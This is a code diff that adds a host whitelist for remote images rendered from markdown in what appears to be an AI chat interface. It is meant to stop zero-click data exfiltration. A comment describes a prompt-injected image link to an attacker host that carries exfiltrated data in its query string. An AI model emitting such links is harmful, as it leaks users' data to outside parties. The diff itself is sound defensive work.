@@ -3156,13 +3156,48 @@ function externalAnchor(href) {
   return a;
 }
 
-// Images (#9): ![alt](https://…) embeds a web image; ![alt](/abs/path.png)
-// is rewritten to the token-gated /file endpoint, which only serves image
-// files inside the active session's roots. Any other scheme stays as the
-// literal text. Tap opens the full-size image in a new tab.
+// [INLINEIMG-START]
+// Remote-image fetch whitelist — keep in lockstep with CSP_IMG_HOSTS in
+// server.py (content_security_policy). The CSP header already blocks other
+// hosts at the browser layer, but only on pages served with the header;
+// enforcing the same policy here makes it hold on EVERY render path
+// (streaming, replay, offline replay, export preview) and degrade to a
+// graceful non-embedded link instead of a CSP violation (#178 P1-12). A
+// prompt-injected ![](https://attacker/x.png?<exfil>) must never fire a
+// zero-click GET at render time.
+const IMG_FETCH_HOSTS = ["img.youtube.com", "i.ytimg.com", "maps.googleapis.com"];
+
+// Pure decision: may this <img src> be set (= fetched) at render time?
+// data: carries its own bytes and same-origin paths (/file?…) stay on our
+// server; a remote host must be on the whitelist. Unparseable → no fetch.
+function imageFetchAllowed(src) {
+  if (src.startsWith("data:")) return true;
+  if (!/^https?:\/\//i.test(src)) return true;
+  try {
+    return IMG_FETCH_HOSTS.includes(new URL(src).hostname.toLowerCase());
+  } catch {
+    return false;
+  }
+}
+// [INLINEIMG-END]
+
+// Images (#9): ![alt](https://…) embeds a whitelisted web image (see
+// IMG_FETCH_HOSTS above — any other remote host renders as a link, never a
+// fetch); ![alt](/abs/path.png) is rewritten to the token-gated /file
+// endpoint, which only serves image files inside the active session's
+// roots. Any other scheme stays as the literal text. Tap opens the
+// full-size image in a new tab.
 function inlineImage(alt, target) {
   let src;
   if (/^https?:\/\//.test(target)) {
+    if (!imageFetchAllowed(target)) {
+      // Same visual as the broken-image note; the anchor keeps the URL
+      // reachable by an explicit user tap — only the zero-click fetch is out.
+      const link = externalAnchor(target);
+      link.className = "img-link img-broken";
+      link.textContent = `🖼 ${alt || target} (not embedded)`;
+      return link;
+    }
     src = target;
   } else if (target.startsWith("/")) {
     const params = new URLSearchParams({ path: target });
